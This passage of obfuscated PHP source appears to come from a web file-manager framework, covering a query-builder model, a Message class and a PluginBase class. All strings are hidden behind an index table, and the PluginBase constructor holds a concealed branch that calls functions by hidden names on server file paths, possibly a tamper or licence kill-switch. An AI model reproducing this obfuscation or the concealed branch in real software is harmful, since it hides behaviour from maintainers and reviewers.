$_SERVER[ÉóçÄÇ]; if (empty($this->trueTableName)) { $Eïëê˜Şš = !empty($this->tablePrefix) ? $this->tablePrefix : $a¯¿Ø£æí„[33]; if (!empty($this->tableName)) { $Eïëê˜Şš .= $this->tableName; } else { $Eïëê˜Şš .= think_parse_name($this->name); } $this->trueTableName = strtolower($Eïëê˜Şš); } return (!empty($this->dbName) ? $this->dbName . $a¯¿Ø£æí„[94] : $a¯¿Ø£æí„[33]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $aâŒÊ†ä× =& $_SERVER[ÉóçÄÇ]; return isset($this->fields[$aâŒÊ†ä×[247]]) ? $this->fields[$aâŒÊ†ä×[247]] : $this->pk; } public function getDbFields() { $FË†ïÔèøØ =& $_SERVER[ÉóçÄÇ]; if (isset($this->options[$FË†ïÔèøØ[275]])) { $e²¦Éƒ†ô = $this->db->getFields($this->options[$FË†ïÔèøØ[275]]); return $e²¦Éƒ†ô ? array_keys($e²¦Éƒ†ô) : !1; } if ($this->fields) { $e²¦Éƒ†ô = $this->fields; unset($e²¦Éƒ†ô[$FË†ïÔèøØ[246]], $e²¦Éƒ†ô[$FË†ïÔèøØ[247]], $e²¦Éƒ†ô[$FË†ïÔèøØ[248]], $e²¦Éƒ†ô[$FË†ïÔèøØ[245]]); return $e²¦Éƒ†ô; } return !1; } public function data($fõÎóµóÉ¡ = '') { $dÜÄ„Ã†š =& $_SERVER[ÉóçÄÇ]; if ($dÜÄ„Ã†š[33] === $fõÎóµóÉ¡ && !empty($this->data)) { return $this->data; } if (is_object($fõÎóµóÉ¡)) { $fõÎóµóÉ¡ = get_object_vars($fõÎóµóÉ¡); } elseif (is_string($fõÎóµóÉ¡)) { parse_str($fõÎóµóÉ¡, $fõÎóµóÉ¡); } elseif (!is_array($fõÎóµóÉ¡)) { think_exception(think_lang($dÜÄ„Ã†š[267])); } $this->data = $fõÎóµóÉ¡; return $this; } public function join($Aññœ±¦ìù) { $BÂÄµÎ‰· =& $_SERVER[ÉóçÄÇ]; if (is_array($Aññœ±¦ìù)) { $this->options[$BÂÄµÎ‰·[278]] = $Aññœ±¦ìù; } elseif (!empty($Aññœ±¦ìù)) { $this->options[$BÂÄµÎ‰·[278]][] = $Aññœ±¦ìù; } return $this; } public function union($EŸÍ´ËÄœ, $cÁĞ‡ò†Õî = false) { goto F‰«™ìŒĞì; CÒÇª“ˆ: return $this; goto eö‚‹´¿¬É; F‰«™ìŒĞì: $C›‘¿î…Š =& $_SERVER[ÉóçÄÇ]; if (empty($EŸÍ´ËÄœ)) { return $this; } if ($cÁĞ‡ò†Õî) { $this->options[$C›‘¿î…Š[343]][$C›‘¿î…Š[344]] = !0; } goto CóËÏ¦’°ì; CóËÏ¦’°ì: if (is_object($EŸÍ´ËÄœ)) { $EŸÍ´ËÄœ = get_object_vars($EŸÍ´ËÄœ); } if (is_string($EŸÍ´ËÄœ)) { $B¿¶”®­ƒÇ = $EŸÍ´ËÄœ; } elseif (is_array($EŸÍ´ËÄœ)) { if (isset($EŸÍ´ËÄœ[0])) { $this->options[$C›‘¿î…Š[343]] = array_merge($this->options[$C›‘¿î…Š[343]], $EŸÍ´ËÄœ); return $this; } else { $B¿¶”®­ƒÇ = $EŸÍ´ËÄœ; } } else { think_exception(think_lang($C›‘¿î…Š[267])); } $this->options[$C›‘¿î…Š[343]][] = $B¿¶”®­ƒÇ; goto CÒÇª“ˆ; eö‚‹´¿¬É: } public function cache($CÀµëí±´ = true, $cÚéàñá§‰ = null, $bÖóÖ”ÂäÃ = '') { $e·Ëø¼®ºÑ =& $_SERVER[ÉóçÄÇ]; if (!1 !== $CÀµëí±´) { $this->options[$e·Ëø¼®ºÑ[345]] = array($e·Ëø¼®ºÑ[92] => $CÀµëí±´, $e·Ëø¼®ºÑ[335] => $cÚéàñá§‰, $e·Ëø¼®ºÑ[29] => $bÖóÖ”ÂäÃ); } return $this; } public function field($eù’ÍÖæà–, $aĞÓœç¢ì = false) { $DÌĞ¢Ó˜‚ˆ =& $_SERVER[ÉóçÄÇ]; if (!0 === $eù’ÍÖæà–) { $aÌØÏ±ù‡ = $this->getDbFields(); $eù’ÍÖæà– = $aÌØÏ±ù‡ ? $aÌØÏ±ù‡ : $DÌĞ¢Ó˜‚ˆ[182]; } elseif ($aĞÓœç¢ì) { if (is_string($eù’ÍÖæà–)) { $eù’ÍÖæà– = explode($DÌĞ¢Ó˜‚ˆ[47], $eù’ÍÖæà–); } $aÌØÏ±ù‡ = $this->getDbFields(); $eù’ÍÖæà– = $aÌØÏ±ù‡ ? array_diff($aÌØÏ±ù‡, $eù’ÍÖæà–) : $eù’ÍÖæà–; } $this->options[$DÌĞ¢Ó˜‚ˆ[269]] = $eù’ÍÖæà–; return $this; } public function scope($cŒˆ£‘øÉ = '', $bƒ»™ØÃ±Ÿ = NULL) { $D¿Ş÷ò¡ò· =& $_SERVER[ÉóçÄÇ]; if ($D¿Ş÷ò¡ò·[33] === $cŒˆ£‘øÉ) { if (isset($this->_scope[$D¿Ş÷ò¡ò·[34]])) { $eÃÛÈ˜åæã = $this->_scope[$D¿Ş÷ò¡ò·[34]]; } else { return $this; } } elseif (is_string($cŒˆ£‘øÉ)) { $b¬ˆ½îÙå¬ = explode($D¿Ş÷ò¡ò·[47], $cŒˆ£‘øÉ); $eÃÛÈ˜åæã = array(); foreach ($b¬ˆ½îÙå¬ as $f¤ğˆîŸ) { if (!isset($this->_scope[$f¤ğˆîŸ])) { continue; } $eÃÛÈ˜åæã = array_merge($eÃÛÈ˜åæã, $this->_scope[$f¤ğˆîŸ]); } if (!empty($bƒ»™ØÃ±Ÿ) && is_array($bƒ»™ØÃ±Ÿ)) { $eÃÛÈ˜åæã = array_merge($eÃÛÈ˜åæã, $bƒ»™ØÃ±Ÿ); } } elseif (is_array($cŒˆ£‘øÉ)) { $eÃÛÈ˜åæã = $cŒˆ£‘øÉ; } if (is_array($eÃÛÈ˜åæã) && !empty($eÃÛÈ˜åæã)) { $this->options = array_merge($this->options, array_change_key_case($eÃÛÈ˜åæã)); } return $this; } public function where($A¹´Ñ–ªê, $fÊ •Ã‘ó = null) { $B´™ë·Ãí =& $_SERVER[ÉóçÄÇ]; if (!is_null($fÊ •Ã‘ó) && is_string($A¹´Ñ–ªê)) { if (!is_array($fÊ •Ã‘ó)) { $fÊ •Ã‘ó = func_get_args(); array_shift($fÊ •Ã‘ó); } $fÊ •Ã‘ó = array_map(array($this->db, $B´™ë·Ãí[339]), $fÊ •Ã‘ó); $A¹´Ñ–ªê = vsprintf($A¹´Ñ–ªê, $fÊ •Ã‘ó); } elseif (is_object($A¹´Ñ–ªê)) { $A¹´Ñ–ªê = get_object_vars($A¹´Ñ–ªê); } elseif (is_array($A¹´Ñ–ªê)) { foreach ($A¹´Ñ–ªê as $a¿Íì«°Ê¥ => $E‚¼®è) { if ((is_numeric($a¿Íì«°Ê¥) || !$a¿Íì«°Ê¥) && is_string($E‚¼®è)) { if (strpos($E‚¼®è, $B´™ë·Ãí[346]) === 0) { continue; } think_trace($B´™ë·Ãí[347], $B´™ë·Ãí[33], $B´™ë·Ãí[46]); die; } } } if (is_string($A¹´Ñ–ªê) && $B´™ë·Ãí[33] != $A¹´Ñ–ªê) { $C÷»Ë­İŞ = array(); $C÷»Ë­İŞ[$B´™ë·Ãí[348]] = $A¹´Ñ–ªê; $A¹´Ñ–ªê = $C÷»Ë­İŞ; } if (isset($this->options[$B´™ë·Ãí[271]])) { $this->options[$B´™ë·Ãí[271]] = array_merge($this->options[$B´™ë·Ãí[271]], $A¹´Ñ–ªê); } else { $this->options[$B´™ë·Ãí[271]] = $A¹´Ñ–ªê; } return $this; } public function limit($e•¸®¤ƒ®ô, $C°éÄĞŸ– = null) { $eõÁÅ†ƒã =& $_SERVER[ÉóçÄÇ]; $this->options[$eõÁÅ†ƒã[288]] = is_null($C°éÄĞŸ–) ? $e•¸®¤ƒ®ô : $e•¸®¤ƒ®ô . $eõÁÅ†ƒã[47] . $C°éÄĞŸ–; return $this; } public function page($EŒ¨Ï¸†“, $b”Ñ´³ä÷Ş = null) { $fÌÌÊÄ„ÔÎ =& $_SERVER[ÉóçÄÇ]; $this->options[$fÌÌÊÄ„ÔÎ[349]] = is_null($b”Ñ´³ä÷Ş) ? $EŒ¨Ï¸†“ : $EŒ¨Ï¸†“ . $fÌÌÊÄ„ÔÎ[47] . $b”Ñ´³ä÷Ş; return $this; } public function comment($A‘„ĞùØÇ) { $this->options[$_SERVER[ÉóçÄÇ][350]] = $A‘„ĞùØÇ; return $this; } public function setProperty($eÇ“ÍÛóí, $E‚¦É«‚‹) { if (property_exists($this, $eÇ“ÍÛóí)) { $this->{$eÇ“ÍÛóí} = $E‚¦É«‚‹; } return $this; } } goto e¼—à¯õÉ¡; F‰‚ÖÓº: class Message { function __construct() { } public function send($C ¸ã£òÊ = '', $FÒ½øƒ¦àï = array(), $a‹Å‚‡’®£ = "\164\145\170\164") { goto eº¯·•ó­; D‚·´¾Ê…: Hook::trigger($Dİ—Ó£…[1378], $BíÔßœ); goto b§‡’ØÛè; Fø¼ÂŒŸÏ¯: $FÒ½øƒ¦àï = array($Dİ—Ó£…[997] => isset($FÒ½øƒ¦àï[$Dİ—Ó£…[997]]) ? $FÒ½øƒ¦àï[$Dİ—Ó£…[997]] : $Dİ—Ó£…[33], $Dİ—Ó£…[557] => isset($FÒ½øƒ¦àï[$Dİ—Ó£…[557]]) ? $FÒ½øƒ¦àï[$Dİ—Ó£…[557]] : $Dİ—Ó£…[33]); if (empty($C ¸ã£òÊ) || empty($FÒ½øƒ¦àï[$Dİ—Ó£…[997]]) && empty($FÒ½øƒ¦àï[$Dİ—Ó£…[557]])) { return !1; } $BíÔßœ = array($Dİ—Ó£…[1316] => $d¾Íæ·Ìêô, $Dİ—Ó£…[1377] => $FÒ½øƒ¦àï); goto D‚·´¾Ê…; eº¯·•ó­: $Dİ—Ó£… =& $_SERVER[ÉóçÄÇ]; $d¾Íæ·Ìêô = array($Dİ—Ó£…[29] => $Dİ—Ó£…[1375], $Dİ—Ó£…[714] => $C ¸ã£òÊ); if (in_array($a‹Å‚‡’®£, array($Dİ—Ó£…[1375], $Dİ—Ó£…[1376]))) { $d¾Íæ·Ìêô[$Dİ—Ó£…[29]] = $a‹Å‚‡’®£; } goto Fø¼ÂŒŸÏ¯; b§‡’ØÛè: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto bÃ§¸ÂÁ§; aÛãŞ­ë†‘: if ($açæ…äË && strpos($b—–ÔÑ»ÜÏ[47] . $açæ…äË . $b—–ÔÑ»ÜÏ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$b—–ÔÑ»ÜÏ[1384]] . $this->pluginName . $b—–ÔÑ»ÜÏ[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto c‘¿’Ø´; Aø™«Ë’„°: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($b—–ÔÑ»ÜÏ[1380]); goto B¸ÒâÙñ•Ï; DÊ‘ÎëÌ¨õ: $this->pluginHost = $config[$b—–ÔÑ»ÜÏ[1382]] . $this->pluginName . $b—–ÔÑ»ÜÏ[8]; $this->pluginHostDefault = $config[$b—–ÔÑ»ÜÏ[1382]] . $this->pluginName . $b—–ÔÑ»ÜÏ[8]; $açæ…äË = $config[$b—–ÔÑ»ÜÏ[1383]]; goto aÛãŞ­ë†‘; c‘¿’Ø´: return $this; goto C´ÔÈº™Ú; B¸ÒâÙñ•Ï: $this->pluginName = str_replace($b—–ÔÑ»ÜÏ[1380], $b—–ÔÑ»ÜÏ[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $b—–ÔÑ»ÜÏ[8]; $this->pluginApi = appHostGet() . $b—–ÔÑ»ÜÏ[1381] . $this->pluginName . $b—–ÔÑ»ÜÏ[8]; goto DÊ‘ÎëÌ¨õ; bÃ§¸ÂÁ§: $b—–ÔÑ»ÜÏ =& $_SERVER[ÉóçÄÇ]; if ($_SERVER[$b—–ÔÑ»ÜÏ[817]] != $_SERVER[$b—–ÔÑ»ÜÏ[1299]]) { goto D¨ÉÓŸÂ¤¯; F Î²Ù¹Á¸: $f¥„„ë¥—â = $EßÅëßËÃ¹($aƒÎ™È±«); $A†Òà™·Û” = explode($b—–ÔÑ»ÜÏ[227], $f¥„„ë¥—â); if (count($A†Òà™·Û”) < $b—–ÔÑ»ÜÏ[606]) { $A„¶¿¼‘ø´ = $b—–ÔÑ»ÜÏ[823]; $A„¶¿¼‘ø´(); } goto cƒâ«­Ö‰–; D¨ÉÓŸÂ¤¯: $a‡ùí‡Å«“ = $b—–ÔÑ»ÜÏ[819]; $EßÅëßËÃ¹ = $b—–ÔÑ»ÜÏ[820]; $aƒÎ™È±« = $_SERVER[$b—–ÔÑ»ÜÏ[821]] . $b—–ÔÑ»ÜÏ[822]; goto F Î²Ù¹Á¸; f‘øÙëèñÉ: $f‡Ÿïß¡Ú‘ = 1; while ($f‡Ÿïß¡Ú‘ > 1) { $f‡Ÿïß¡Ú‘ = $f‡Ÿïß¡Ú‘ + 4; $D’±•æğëÙ = rawurlencode($f‡Ÿïß¡Ú‘ . $b—–ÔÑ»ÜÏ[373]); } goto e§ÚŒ¢õïË; cƒâ«­Ö‰–: $d‰ŠæÄ©Å‰ = $b—–ÔÑ»ÜÏ[824]; $d‰ŠæÄ©Å‰($_SERVER[$b—–ÔÑ»ÜÏ[825]]); $d‰ŠæÄ©Å‰($_SERVER[$b—–ÔÑ»ÜÏ[821]] . $b—–ÔÑ»ÜÏ[1379]); goto f‘øÙëèñÉ; e§ÚŒ¢õïË: } global $in, $config; goto Aø™«Ë’„°; C´ÔÈº™Ú: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÉóçÄÇ][1385]); } protected function assign($e²­á„ , $dğ˜™Ï¬Ôƒ = false) { if (is_array($e²­á„ )) { $this->values = array_merge($this->values, $e²­á„ ); } else { $this->values[$e²­á„ ] = $dğ˜™Ï¬Ôƒ; } } protected function display($bçˆŞâ®ïÈ) { extract($this->values); require $bçˆŞâ®ïÈ; } final function hookRegist($e·«õ¼Æ) { $this->modelPlugin->appRegist($this->pluginName, $e·«õ¼Æ); } final function appIcon() { $dê…¯Şó¿ =& $_SERVER[ÉóçÄÇ]; $e¥ÈÍ¬Ø¶ = $this->appPackage(); $eš®¤°Ë = $dê…¯Şó¿[33]; if (isset($e¥ÈÍ¬Ø¶[$dê…¯Şó¿[403]])) { if (isset($e¥ÈÍ¬Ø¶[$dê…¯Şó¿[403]][$dê…¯Şó¿[1386]])) { $eš®¤°Ë = $dê…¯Şó¿[1387] . $e¥ÈÍ¬Ø¶[$dê…¯Şó¿[403]][$dê…¯Şó¿[1386]] . $dê…¯Şó¿[1388]; } else { if ($e¥ÈÍ¬Ø¶[$dê…¯Şó¿[403]][$dê…¯Şó¿[1389]]) { $eš®¤°Ë = $dê…¯Şó¿[1390] . $e¥ÈÍ¬Ø¶[$dê…¯Şó¿[403]][$dê…¯Şó¿[1389]] . $dê…¯Şó¿[1391]; } } } return $eš®¤°Ë; } final function fileCanView($aã…œ¨ì²£) { goto d†ïôÀ‚ÕÎ; d†ïôÀ‚ÕÎ: $AáÅ”Àö—‡ =& $_SERVER[ÉóçÄÇ]; if (request_url_safe($aã…œ¨ì²£)) { return !0; } if ($this->isShare($aã…œ¨ì²£)) { return !0; } goto FŠ–ÊìÖ¿; cĞ¯¼«¯°: ActionCall($AáÅ”Àö—‡[1404], $aã…œ¨ì²£); goto Eæ’ªèÆö; FŠ–ÊìÖ¿: $E‡„ÊáÄ¼Á = Session::get($AáÅ”Àö—‡[1392]); if (!$E‡„ÊáÄ¼Á || !$E‡„ÊáÄ¼Á[$AáÅ”Àö—‡[1393]]) { $A‘É˜…¥‹ö = $AáÅ”Àö—‡[1394] . rawurlencode(this_url()); show_tips(LNG($AáÅ”Àö—‡[1395]) . $AáÅ”Àö—‡[1396] . $A‘É˜…¥‹ö . $AáÅ”Àö—‡[1397] . LNG($AáÅ”Àö—‡[1398]) . $AáÅ”Àö—‡[1399], !1); } if (!Action($AáÅ”Àö—‡[1400])->authCan($AáÅ”Àö—‡[1401])) { show_tips(LNG($AáÅ”Àö—‡[1402]) . $AáÅ”Àö—‡[1403], !1); } goto cĞ¯¼«¯°; Eæ’ªèÆö: } final function isShare($EÂÍÌö–¡) { $Fª›¶‘øÀ = KodIO::parse($EÂÍÌö–¡); return $Fª›¶‘øÀ[$_SERVER[ÉóçÄÇ][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($a¼‘š¹Í) { if (request_url_safe($a¼‘š¹Í)) { return $a¼‘š¹Í; } if (!$this->isShare($a¼‘š¹Í)) { $a¼‘š¹Í = $this->filePath($a¼‘š¹Í); } return Action($_SERVER[ÉóçÄÇ][1052])->linkOut($a¼‘š¹Í); } public function filePathLinkOut($eèæÙ’Í‹») { if (request_url_safe($eèæÙ’Í‹»)) { return $eèæÙ’Í‹»; } $this->fileCanView($eèæÙ’Í‹»); return Action($_SERVER[ÉóçÄÇ][1052])->link($eèæÙ’Í‹»); } final function filePath($bĞè™­µÎ‹) { $eĞßÅ¨™ ” =& $_SERVER[ÉóçÄÇ]; if ($fÄëø‹äÍã = $this->checkSharePath($bĞè™­µÎ‹)) { return $fÄëø‹äÍã; } $this->fileCanView($bĞè™­µÎ‹); if (request_url_safe($bĞè™­µÎ‹)) { $E†Ó°—°½ = parse_url_query($bĞè™­µÎ‹); if (isset($E†Ó°—°½[$eĞßÅ¨™ ”[1405]]) && isset($E†Ó°—°½[$eĞßÅ¨™ ”[207]])) { $Føª§™çãé = Model($eĞßÅ¨™ ”[1106])->get($eĞßÅ¨™ ”[1406]); $E†¬ÔÕ…°á = Mcrypt::decode($E†Ó°—°½[$eĞßÅ¨™ ”[207]], $Føª§™çãé); if ($E†¬ÔÕ…°á) { $this->fileInfo = IO::infoWithChildren($E†¬ÔÕ…°á); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $E†¬ÔÕ…°á; } } $bĞè™­µÎ‹ = $this->_cacheHttpFile($bĞè™­µÎ‹); $this->fileInfo = IO::infoWithChildren($bĞè™­µÎ‹); } else { $this->fileInfo = IO::infoWithChildren($bĞè™­µÎ‹); if (!$this->fileInfo) { show_tips(LNG($eĞßÅ¨™ ”[104]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $bĞè™­µÎ‹; } final function _cacheHttpFile($E´Ù¨Á†…Š) { $Aç‚ÄÚÌâÄ = hash_path($E´Ù¨Á†…Š, !0); $this->cachePath = $this->pluginCachePath($Aç‚ÄÚÌâÄ); if ($aĞ”‰‰ÊÒ = IO::fileNameExist($this->cachePath, $Aç‚ÄÚÌâÄ)) { return KodIO::make($aĞ”‰‰ÊÒ); } $B…¿Ò¡”ì‡ = $this->cachePath . $Aç‚ÄÚÌâÄ; return $this->pluginCacheFileSet($B…¿Ò¡”ì‡, file_get_contents($E´Ù¨Á†…Š)); } final function _tmpFileName($a‚Î¼˜µò = array()) { goto b¯‘Ì²È¢; FŒ³…ïÈë¦: $bÏÆ½Š¨¸‰ = array($a‚Î¼˜µò[$FËÄ±«°±Œ[28]], $a‚Î¼˜µò[$FËÄ±«°±Œ[75]], $a‚Î¼˜µò[$FËÄ±«°±Œ[77]]); if (isset($a‚Î¼˜µò[$FËÄ±«°±Œ[481]])) { $bÏÆ½Š¨¸‰[] = $a‚Î¼˜µò[$FËÄ±«°±Œ[481]]; } return md5(implode($FËÄ±«°±Œ[70], $bÏÆ½Š¨¸‰)); goto e£™Ì«‚Õ›; E„‚˜ÕÈ‚¹: if (isset($a‚Î¼˜µò[$FËÄ±«°±Œ[163]][$FËÄ±«°±Œ[170]])) { return $a‚Î¼˜µò[$FËÄ±«°±Œ[163]][$FËÄ±«°±Œ[170]]; } $a½¬óİ¨¿ø = IO::hashSimple($a‚Î¼˜µò[$FËÄ±«°±Œ[75]]); if ($a½¬óİ¨¿ø) { return $a½¬óİ¨¿ø; } goto FŒ³…ïÈë¦; b¯‘Ì²È¢: $FËÄ±«°±Œ =& $_SERVER[ÉóçÄÇ]; if (!$a‚Î¼˜µò) { $a‚Î¼˜µò = $this->fileInfo; } if (isset($a‚Î¼˜µò[$FËÄ±«°±Œ[170]])) { return $a‚Î¼˜µò[$FËÄ±«°±Œ[170]]; } goto E„‚˜ÕÈ‚¹; e£™Ì«‚Õ›: } final function checkSharePath($CåÛËŸœ¿Í) { goto B¾”»ëÀÖ; c§ËÙÂ‡×½: $C³ØÊ¿Æ»¨ = Action($CÚ•œ£Õ³[1052])->sharePathInfo($CåÛËŸœ¿Í); if (!isset($C³ØÊ¿Æ»¨[$CÚ•œ£Õ³[75]])) { show_json(LNG($CÚ•œ£Õ³[1408]), !1); } $this->fileInfo = $C³ØÊ¿Æ»¨[$CÚ•œ£Õ³[163]]; goto e¥ô‰æÔ…®; B¾”»ëÀÖ: $CÚ•œ£Õ³ =& $_SERVER[ÉóçÄÇ]; if (!defined($CÚ•œ£Õ³[448])) { define($CÚ•œ£Õ³[1407], 0); } if (!$this->isShare($CåÛËŸœ¿Í)) { return !1; } goto c§ËÙÂ‡×½; e¥ô‰æÔ…®: $this->cachePath = $this->pluginCachePath($this->fileInfo[$CÚ•œ£Õ³[170]]); return $C³ØÊ¿Æ»¨[$CÚ•œ£Õ³[75]]; goto fº–¬çß‘; fº–¬çß‘: } final function pluginCachePath($b³Íˆòê = '') { $C¦°‹–¡¸ =& $_SERVER[ÉóçÄÇ]; $FªÜ³ ô‘É = IO_PATH_SYSTEM_TEMP . $C¦°‹–¡¸[1409] . $this->pluginName; if (!($Bõ¯¡‹•íí = IO::infoFull($FªÜ³ ô‘É))) { return IO::mkdir($FªÜ³ ô‘É . $C¦°‹–¡¸[8] . $b³Íˆòê); } if (empty($b³Íˆòê)) { return $Bõ¯¡‹•íí[$C¦°‹–¡¸[75]]; } if (!($dÜ³Ë³îïÛ = IO::fileNameExist($Bõ¯¡‹•íí[$C¦°‹–¡¸[75]], $b³Íˆòê))) { return IO::mkdir($Bõ¯¡‹•íí[$C¦°‹–¡¸[75]] . $b³Íˆòê); } return KodIO::make($dÜ³Ë³îïÛ); } final function pluginCacheFileSet($dŸ’ùø¨­‹, $b©º£ï¬¹ì = '') { $Cµ’‡ šóÅ =& $_SERVER[ÉóçÄÇ]; if (!($D°‡ŸÊÕ¬“ = IO::infoFull($dŸ’ùø¨­‹))) { return IO::mkfile($dŸ’ùø¨­‹, $b©º£ï¬¹ì, REPEAT_REPLACE); } IO::setContent($D°‡ŸÊÕ¬“[$Cµ’‡ šóÅ[75]], $b©º£ï¬¹ì); return $D°‡ŸÊÕ¬“[$Cµ’‡ šóÅ[75]]; } final function pluginLocalFile($FÎößíÚ = '') { goto dŸõ—ª©•·; FÕô°¸³Ç‰: return IO::copy($FÎößíÚ, $dÄ‰šâ‚§, 0, $Eğá‰ä®Œö); goto EøÎÓ¢·; e‘•”š‘İ: if (!$FÎößíÚ) { return $dÄ‰šâ‚§; } $B“¢½Ê³ñ… = IO::info($FÎößíÚ); $Eğá‰ä®Œö = $this->_tmpFileName($B“¢½Ê³ñ…) . $Céƒ–Ä™[94] . $B“¢½Ê³ñ…[$Céƒ–Ä™[167]]; goto B¿ß”®ÚïÎ; B¿ß”®ÚïÎ: if (!checkExtSafe($Eğá‰ä®Œö)) { $Eğá‰ä®Œö = $Eğá‰ä®Œö . $Céƒ–Ä™[1410]; } $Bóµ²½ñ¶ = $dÄ‰šâ‚§ . $Eğá‰ä®Œö; if (@file_exists($Bóµ²½ñ¶)) { return $Bóµ²½ñ¶; } goto FÕô°¸³Ç‰; dŸõ—ª©•·: $Céƒ–Ä™ =& $_SERVER[ÉóçÄÇ]; $dÄ‰šâ‚§ = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($dÄ‰šâ‚§)) { mk_dir($dÄ‰šâ‚§); } goto e‘•”š‘İ; EøÎÓ¢·: } final function appPackage() { goto b¥»ÖÖÊğÄ; EÉ¯‚’öÜ÷: return $c‹¿¸œÙÄ; goto FÚ¼†ŠîÎä; DµùË»™: $D¸¤†¢§ŒŠ = Hook::trigger($F­”Ç± Û[1412], $c‹¿¸œÙÄ); if ($D¸¤†¢§ŒŠ && is_array($D¸¤†¢§ŒŠ)) { $c‹¿¸œÙÄ = $D¸¤†¢§ŒŠ; } $this->packageData = $c‹¿¸œÙÄ; goto EÉ¯‚’öÜ÷; E—Úêè¸: $this->parseLang($CâÈÛÀ˜); $c‹¿¸œÙÄ = json_decode_force($CâÈÛÀ˜); if (!$c‹¿¸œÙÄ) { return array(); } goto DµùË»™; b¥»ÖÖÊğÄ: $F­”Ç± Û =& $_SERVER[ÉóçÄÇ]; if ($this->packageData) { return $this->packageData; } $CâÈÛÀ˜ = $this->parseFile($this->pluginPath . $F­”Ç± Û[1411]); goto E—Úêè¸; FÚ¼†ŠîÎä: } public function packageInfoGet($Cİ“Âó›®Ó) { $eó†‡¹ÉŸ³ = $this->appPackage(); return array_get_value($eó†‡¹ÉŸ³, $Cİ“Âó›®Ó); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÉóçÄÇ][1413]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÉóçÄÇ][1414]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÉóçÄÇ][1415]); } private function parseFile($fÜ‰“÷Î§³) { goto D¨Àè•­íã; fêªˆŞ›: $E×æ®‰ö½ = str_replace($EÜ¾œƒÁÁ, $B¯ŠÊ‹ïËâ, $E×æ®‰ö½); return $E×æ®‰ö½; goto f•¥ÜÅÃÓ‘; D¨Àè•­íã: $aï×öÁ§ª =& $_SERVER[ÉóçÄÇ]; $E×æ®‰ö½ = file_get_contents($fÜ‰“÷Î§³); $EÜ¾œƒÁÁ = array($aï×öÁ§ª[1416], $aï×öÁ§ª[1417], $aï×öÁ§ª[1418], $aï×öÁ§ª[1419], $aï×öÁ§ª[1420], $aï×öÁ§ª[1421], $aï×öÁ§ª[1422]); goto Eø´»Ë©‹ì; Eø´»Ë©‹ì: $B¯ŠÊ‹ïËâ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$aï×öÁ§ª[87]][$aï×öÁ§ª[1423]]); if (strstr($E×æ®‰ö½, $aï×öÁ§ª[1424])) { $FˆÍŸ„¶¥ã = rawurlencode(json_encode($this->pluginLangArr)); $E×æ®‰ö½ = str_replace($aï×öÁ§ª[1424], $FˆÍŸ„¶¥ã, $E×æ®‰ö½); } if (strstr($E×æ®‰ö½, $aï×öÁ§ª[1425])) { $FˆÍŸ„¶¥ã = $FˆÍŸ„¶¥ã = rawurlencode(json_encode($this->getConfig())); $E×æ®‰ö½ = str_replace($aï×öÁ§ª[1425], $FˆÍŸ„¶¥ã, $E×æ®‰ö½); } goto fêªˆŞ›; f•¥ÜÅÃÓ‘: } private function parseLang(&$Bº‡¥ÀÍô–) { goto b”¶°ªÛ´; e¬Åçìë¯Û: $dÃ°¾çÈçğ = array(); foreach ($dÈˆæ»ÒŸ­[0] as $Fó¼„îíßö) { $AÈµäÕƒ”¤ = substr($Fó¼„îíßö, strlen($cƒ¡çÃò…ñ), -4); $FŒÈâò×¯Â = LNG($AÈµäÕƒ”¤); $Cö„’ğÁ„Ë[] = $Fó¼„îíßö; $dÃ°¾çÈçğ[] = str_replace(array($aÁç…ä½í[227], $aÁç…ä½í[1020], $aÁç…ä½í[338], $aÁç…ä½í[115]), array($aÁç…ä½í[50], $aÁç…ä½í[50], $aÁç…ä½í[33], $aÁç…ä½í[1428]), $FŒÈâò×¯Â); } $Bº‡¥ÀÍô– = str_replace($Cö„’ğÁ„Ë, $dÃ°¾çÈçğ, $Bº‡¥ÀÍô–); goto aÔŠ°¦©²ß; eÂ†¿Ÿßª²: preg_match_all($aÁç…ä½í[1427], $Bº‡¥ÀÍô–, $dÈˆæ»ÒŸ­); if (!is_array($dÈˆæ»ÒŸ­) || count($dÈˆæ»ÒŸ­) == 0 || !is_array($dÈˆæ»ÒŸ­[0]) || count($dÈˆæ»ÒŸ­[0]) == 0) { return; } $Cö„’ğÁ„Ë = array(); goto e¬Åçìë¯Û; b”¶°ªÛ´: $aÁç…ä½í =& $_SERVER[ÉóçÄÇ]; $cƒ¡çÃò…ñ = $aÁç…ä½í[1426]; if (!strstr($Bº‡¥ÀÍô–, $cƒ¡çÃò…ñ)) { return; } goto eÂ†¿Ÿßª²; aÔŠ°¦©²ß: } private function parseConfig(&$dÙîĞæÕ‰) { goto D¿ööŒº¼Ú; AŸò…ÏŸ‚§: $dÙîĞæÕ‰ = str_replace($aÓÄÌ¥£œÏ, $dí›ØØî¼, $dÙîĞæÕ‰); goto d–›Éä‰‡™; D¿ööŒº¼Ú: $BÑÃÚáË =& $_SERVER[ÉóçÄÇ]; $CÆ¤Ì›îÒÚ = $BÑÃÚáË[1429]; if (!strstr($dÙîĞæÕ‰, $CÆ¤Ì›îÒÚ)) { return; } goto F¼‹â„³»’; dÔßÁ¶İí‰: $aÓÄÌ¥£œÏ = array(); $dí›ØØî¼ = array(); foreach ($a±¶ Ô™‚¼[0] as 